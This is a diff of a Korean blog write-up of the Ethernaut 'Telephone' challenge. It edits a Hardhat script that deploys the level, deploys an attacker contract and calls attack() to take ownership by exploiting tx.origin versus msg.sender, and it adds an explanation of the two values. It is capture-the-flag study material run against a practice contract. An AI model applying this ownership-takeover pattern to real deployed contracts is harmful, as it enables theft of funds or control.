@@ -76,29 +76,30 @@ const { ethers } = require('hardhat');
 
 async function main() {
   const [owner, player] = await ethers.getSigners();
-  console.log("[0] original owner: ", owner.address);
+  console.log("\n[0] original owner: ", owner.address);
   console.log("[0] player: ", player.address);
 
-  console.log("[1] deploy CoinFlipFactory");
+  console.log("\n[1] deploy TelephonFactory");
   const Factory = await ethers.getContractFactory("TelephoneFactory");
   const factory = await Factory.deploy();
   await factory.deployed();
+  console.log("---- TelephoneFactory address: ", factory.address);
 
-  console.log("[2] create a CoinFlip instance");
-  const receipt = await factory.createInstance(owner.address);
+  console.log("\n[2] create a Telephon instance");
+  const receipt = await factory.createInstance(player.address);
   const instance_address = (await receipt.wait()).events[0].args[0];
   const telephone = await ethers.getContractAt("Telephone", instance_address, owner);
 
-  console.log("[3] deploy Caller");
+  console.log("\n[3] deploy Caller");
   const Caller = await ethers.getContractFactory("TelephoneCaller");
-  const caller = await Caller.deploy();
+  const caller = await Caller.connect(player).deploy();
   await caller.deployed();
   console.log("---- TelephoneCaller address: ", caller.address);
 
-  console.log("[4] call attack()");
-  await caller.attack(telephone.address, player.address);
+  console.log("\n[4] call attack()");
+  await caller.connect(player).attack(telephone.address, player.address);
 
-  console.log("[5] validate solved");
+  console.log("\n[5] validate solved");
   const res = await factory.validateInstance(telephone.address, player.address);
   if (res == true) {
     console.log("[+] Done!");
@@ -129,6 +130,7 @@ main().catch((error) => {
 # Conclusion
 여러 스마트 컨트랙트를 연결하여 **Call Chain**을 구성하는 패턴은 자주 쓰일 것으로 보입니다.
 이 때, `tx.origin`과 `msg.sender`의 개념을 정확히 이해하고 있어야 여러 logical error 의 발생을 막고 안전한 스마트 컨트랙트를 작성할 수 있습니다.
+`Transaction` 은 서명이 필요하고 서명을 위해서는 `비밀키`를 갖고 있어야 한다는 점을 상기하면, `tx.origin`은 `EOA`의 정보를 계속 가지고 가고 `msg.sender`는 함수 호출 과정에서 필요한 직전 계정의 정보를 담고 있다고 이해할 수 있습니다.
 
 <script src="https://utteranc.es/client.js"
         repo="c0np4nn4/utterance_repo"
